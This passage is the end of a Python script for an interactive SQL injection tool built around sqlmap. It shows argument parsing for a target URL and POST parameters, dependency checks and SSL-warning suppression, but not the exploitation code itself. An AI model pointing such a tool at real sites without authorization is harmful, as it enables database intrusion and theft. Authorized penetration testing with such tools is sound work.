            print(f"\n{Colors.RED}[-] sqlmap not found!")
            print(f"{Colors.YELLOW}[!] Most features require sqlmap.")
            print(f"{Colors.YELLOW}[!] Install with: sudo apt install sqlmap")
            proceed = input(f"{Colors.CYAN}[?] Continue with limited features? (y/n): ").strip().lower()
            if proceed != 'y':
                return
        
        # Start interactive menu
        self.interactive_menu()
        
        print(f"\n{Colors.CYAN}{'='*60}")
        print(f"{Colors.CYAN}[*] Session completed!")
        print(f"{Colors.CYAN}[*] All results saved in: {self.output_dir}")
        print(f"{Colors.CYAN}[*] Developer: {self.author} | Twitter: {self.twitter}")
        print(f"{Colors.CYAN}[*] Use this tool only for authorized testing")
        print(f"{Colors.CYAN}{'='*60}")

def signal_handler(signum, frame):
    """Handle interrupt signals"""
    print(f"\n\n{Colors.RED}[!] Interrupt received. Exiting...")
    sys.exit(0)

def main():
    """Main entry point"""
    # Setup signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='Interactive SQLi Hunter - Full Control Exploitation')
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-p', '--param', help='Parameter name (for POST requests)')
    parser.add_argument('-v', '--value', help='Parameter value')
    parser.add_argument('--check', action='store_true', help='Check dependencies only')
    
    args = parser.parse_args()
    
    # Create tool instance
    tool = InteractiveSQLiExploiter()
    
    if args.check:
        print(f"{Colors.GREEN}[+] Interactive SQLi Hunter - Dependency Check")
        print(f"{Colors.CYAN}[*] Python version: {sys.version}")
        print(f"{Colors.CYAN}[*] sqlmap available: {tool.sqlmap_available}")
        print(f"{Colors.CYAN}[*] Output directory: {tool.output_dir}")
        sys.exit(0)
    
    # If URL provided via command line
    if args.url:
        tool.target_url = args.url
        tool.params, tool.param_name, tool.param_value = tool.parse_target(args.url)
        
        if args.param and args.value:
            tool.param_name = args.param
            tool.param_value = args.value
            tool.request_method = "POST"
        
        # Test injection and start interactive mode
        tool.test_injection()
        tool.interactive_menu()
    else:
        # Interactive mode
        tool.run()

if __name__ == "__main__":
    # Check Python version
    if sys.version_info < (3, 6):
        print(f"{Colors.RED}[!] Python 3.6 or higher is required")
        sys.exit(1)
    
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Run main function
    main()
